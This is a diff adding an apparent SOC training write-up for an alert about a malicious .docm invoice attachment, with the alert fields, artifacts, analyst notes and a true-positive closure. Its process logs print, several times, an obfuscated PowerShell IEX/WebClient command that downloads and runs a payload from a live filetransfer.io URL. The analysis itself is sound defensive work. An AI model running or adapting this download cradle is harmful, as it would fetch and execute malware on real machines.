@@ -1,1 +1,108 @@
-	SOC137 - Malicious File Script Download Attempt
+
+-- SOC137 - Malicious File Script Download Attempt --
+
+Medium Mar, 14, 2021, 07:15 PM - SOC137 - Malicious File/Script Download Attempt - EventID: 76
+
+	
+EventID : 76
+Event Time : Mar, 14, 2021, 07:15 PM
+Rule : SOC137 - Malicious File/Script Download Attempt
+Level : Security Analyst
+Source Address : 172.16.17.37
+Source Hostname : NicolasPRD
+File Name : INVOICE PACKAGE LINK TO DOWNLOAD.docm
+File Hash : f2d0c66b801244c059f636d08a474079
+File Size : 16.66 Kb
+Device Action : Blocked
+File (Password:infected) : Download
+
+
+I didn’t find anything suspicious on the host in any analysis tab. I checked the log management if there is any communication with the malicious IP, however I also do not see any trace of any interaction with an C2C Server.
+
+
+-- Analysis Result --
+
+File is Malicious
+Containment Required: No 
+Malware quarantined
+
+
+-- Artifacts --
+
+Source IP Address : 172[.]16[.]17[.]37
+File Name : INVOICE PACKAGE LINK TO DOWNLOAD.docm
+MD5 : f2d0c66b801244c059f636d08a474079
+Malicious URL: hxxps[://]filetransfer[.]io/data-package/UR2whuBv/download
+Malicious Domain: hxxps[://]filetransfer[.]io
+DNS: 104[.]21[.]64[.]168
+
+
+-- Analyst Note --
+
+The file INVOICE PACKAGE LINK TO DOWNLOAD.docm executed on host 172.16.17.37 and launched obfuscated PowerShell attempting to download a remote payload from filetransfer.io.
+The download action was blocked by the security control, preventing execution of the retrieved script.
+No further C2 communication or persistence activity was observed.
+Alert confirmed as True Positive; no additional containment required.
+
+
+-- Close Alert --
+
+True Positive
+
+Malicious .docm executed on host 172.16.17.37 and triggered obfuscated PowerShell attempting to download a payload from filetransfer.io. The download was blocked and no C2 or persistence activity was observed. Alert confirmed as True Positive; no further containment required.
+
+*******************************************************************************************************************************
+
+-- Processes created --
+
+hash: 5f0692820151ac639fb8bd399bf087954d5bc46b, path: \\?\C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, commandline: powershell I`EX ((n`e`W`-Obj`E`c`T (('Net'+'.'+'Webc'+'lient'))).(('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'n'+'g')).InVokE((('https://filetransfer.io/data-package/UR2whuBv/download'))))
+"C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\<USER>\Desktop\attachment.docm" /q
+C:\Windows\Explorer.EXE
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc
+C:\Windows\System32\svchost.exe -k NetworkService -p
+C:\Windows\system32\lsass.exe
+C:\Windows\system32\services.exe
+C:\Windows\system32\svchost.exe -k LocalService -s W32Time
+C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+powershell I`EX ((n`e`W`-Obj`E`c`T (('Net'+'.'+'Webc'+'lient'))).(('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'n'+'g')).InVokE((('https://filetransfer.io/data-package/UR2whuBv/download'))))
+
+
+-- Shell commands --
+
+"%ProgramFiles(x86)%\Microsoft Office\Office14\WINWORD.EXE" %SAMPLEPATH%
+"pwsh.exe" I`EX ((n`e`W`-Obj`E`c`T (('Net'+'.'+'Webc'+'lient'))).(('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'n'+'g')).InVokE((('https://filetransfer.io/data-package/UR2whuBv/download'))))
+"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
+C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc
+C:\Windows\System32\svchost.exe -k NetworkService -p
+C:\Windows\System32\svchost.exe -k netsvcs -p
+C:\Windows\system32\lsass.exe
+C:\Windows\system32\sppsvc.exe
+C:\Windows\system32\svchost.exe -k LocalService -s W32Time
+C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+
+
+
+powershell I`EX ((n`e`W`-Obj`E`c`T (('Net'+'.'+'Webc'+'lient'))).(('D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'s'+'tri'+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+''+'n'+'g')).InVokE((('https://filetransfer.io/data-package/UR2whuBv/download'))))
+
+
+
+
+
+
+https://www.virustotal.com/gui/file/08d4fd5032b8b24072bdff43932630d4200f68404d7e12ffeeda2364c8158873
+
+https://hybrid-analysis.com/sample/08d4fd5032b8b24072bdff43932630d4200f68404d7e12ffeeda2364c8158873
+
+https://app.any.run/tasks/8436bfa5-72c2-49d1-a839-b585181e55ee
+
+https://www.filescan.io/uploads/692f400a4b939d3e40ae871c/reports/ca73d353-1708-4698-b368-004425a5214b/emulation_data?emulationTab=input&collapseId=INVOICE+PACKAGE+LINK+TO+DOWNLOAD.docm&genericNodeType=process
+
+
+*
+
+
+
+
+
+
+
